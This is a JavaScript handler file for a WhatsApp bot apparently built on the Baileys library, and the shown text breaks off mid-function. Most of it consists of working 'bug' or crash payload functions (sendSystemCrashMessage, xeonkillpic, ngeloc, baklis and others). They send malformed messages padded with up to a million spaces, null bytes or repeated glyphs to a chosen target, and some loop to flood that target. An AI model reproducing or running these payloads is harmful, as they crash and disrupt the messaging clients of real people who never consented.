/*

MIT License

Copyright (c) 2024 anggazyy (selaku pembuat script ini)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.



*/

module.exports = async (anggazyy, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''

//========== DATABASE ===========//
const antilink = JSON.parse(fs.readFileSync('./all/database/antilink.json'))
const antilink2 = JSON.parse(fs.readFileSync('./all/database/antilink2.json'))
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const premium = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const owner2 = JSON.parse(fs.readFileSync("./all/database/owner.json"))
const teksjpm = fs.readFileSync("./list/teksjpm.js").toString()
const isPremium = premium.includes(m.sender)
const { jadibot, stopjadibot, listjadibot } = require('./clonebot/jadibot')
const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
const jangan = m.isGroup ? pler.includes(m.chat) : false
//========= CONFIGURASI ==========//
const budy = (typeof m.text == 'string' ? m.text : '')
const isOwner = owner2.includes(m.sender) ? true : m.sender == owner+"@s.whatsapp.net" ? true : m.fromMe ? true : false
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : isOwner && !m.isBaileys ? '' : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
var crypto = require("crypto")
let { randomBytes } = require("crypto")
const makeid = randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const from = m.key.remoteJid
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await anggazyy.decodeJid(anggazyy.user.id)
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = m.isGroup ? await anggazyy.groupMetadata(m.chat).catch(e => {}) : {}
let participant_bot = m.isGroup ? groupMetadata?.participants.find((v) => v.id == botNumber) : {}
let participant_sender = m.isGroup ? groupMetadata?.participants.find((v) => v.id == m.sender) : {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const { runtime, getRandom, getTime, tanggal, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson, resize } = require('./all/function.js')
const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
const fakejpg = fs.readFileSync(`./src/bruhhh.jpg`)
const { ios } = require("./virtex/ios.js")
const nulll = fs.readFileSync(`./image/nulll.jpg`)
const nulll2 = fs.readFileSync(`./image/nulll2.jpg`)
const mengkece = fs.readFileSync(`./image/mengkece.jpg`)
const latx = fs.readFileSync(`./image/latx.png`)
const fakedoc = fs.readFileSync(`./src/bruhhh.apk`)
//=========== MESSAGE ===========//
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
}

//========= FAKE QUOTED =========//
const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}


const qcall = {
key: {
participant: "0@s.whatsapp.net",
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": `${namabot} Project`,
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}


const anggazyycrash = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝙰𝙽𝙶𝙶𝙰𝚉𝚈𝚈 𝙾𝙵𝙲𝙲 666╮⭑ ☠️⃰͜͡؜𝙰𝙽𝙶𝙶𝙰𝚉𝚈𝚈 𝙾𝙵𝙲𝙲 666⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}




//=================================================//
const anggazyycrash2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝙰𝙽𝙶𝙶𝙰𝚉𝚈𝚈 𝙾𝙵𝙲𝙲 666╮⭑ ☠️⃰͜͡؜𝙰𝙽𝙶𝙶𝙰𝚉𝚈𝚈 𝙾𝙵𝙲𝙲 666⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}





//=================================================//


const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": "🌠 DevilS Client - Multi Device",
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}

const anggazyyphone = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}

const anggazyyvoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}

const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

const angggazyyvault = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `pois0n - DevilS`
}
}
}

const angggazyybut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: 'pois0n - DevilS',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}

const angggazyybug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `🔥`,
jpegThumbnail: fakejpg,
caption: ` DevilS - Bug ? \n ⿻ ${m.body || m.mtype} `,
inviteExpiration: Date.now() + 1814400000
}
}
};

const qpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}



const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakedoc,
}
}
}
const qvn = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 359996400,
"ptt": "true"
}
}
}




const qgif = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'gifPlayback': 'true',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qinvite = {
key: {
participant: "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": "m",
"groupName": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"caption": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": "",
},
"title": `${namaowner2} - Marketplace`,
"description": null,
"currencyCode": "IDR",
"priceAmount1000": "999999999999999",
"retailerId": `Powered By Ibzz`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}}
}



const qloc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakejpg,
}
}
}



const qcontact = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
'jpegThumbnail': fakejpg,
thumbnail: fakejpg,
sendEphemeral: true
}
}
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "🦄드림 가이 Xeon"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: oneclickxeon });
await anggazyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await anggazyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function locationxeony(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await anggazyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await anggazyy.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function xeonkillpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🦄드림 가이 Xeon",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/cheemspic.jpg" } }, { upload: anggazyy.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #🦄드림 가이 Xeon"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await anggazyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

/// FUNCTION BUG 
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝙰𝙽𝙶𝙶𝙰𝚉𝚈𝚈 𝙾𝙵𝙲𝙲 666╮⭑ ☠️⃰͜͡؜𝙰𝙽𝙶𝙶𝙰𝚉𝚈𝚈 𝙾𝙵𝙲𝙲 666⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await anggazyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    anggazyy.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}
async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await anggazyy.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(920000),
      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await anggazyy.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}


async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return anggazyy.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return anggazyy.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}


async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ DevilS ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍𝙰𝙽𝙶𝙶𝙰𝚉𝚈𝚈 𝙾𝙵𝙲𝙲 666╮⭑ ☠️⃰͜͡؜𝙰𝙽𝙶𝙶𝙰𝚉𝚈𝚈 𝙾𝙵𝙲𝙲 666⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍𝙰𝙽𝙶𝙶𝙰𝚉𝚈𝚈 𝙾𝙵𝙲𝙲 666╮⭑ ☠️⃰͜͡؜𝙰𝙽𝙶𝙶𝙰𝚉𝚈𝚈 𝙾𝙵𝙲𝙲 666⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: angggazyyvault });
await anggazyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function anggazyyiphone(target) {
await anggazyy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
async function anggazyydevil(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️᜴࿆͆᷍𝙰𝙽𝙶𝙶𝙰𝚉𝚈𝚈 𝙾𝙵𝙲𝙲 666╮⭑ ☠️⃰͜͡؜𝙰𝙽𝙶𝙶𝙰𝚉𝚈𝚈 𝙾𝙵𝙲𝙲 666⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await anggazyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b2a83eec1206c6acea5e1.jpg" } }, { upload: anggazyy.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #anggazyy666"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await anggazyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
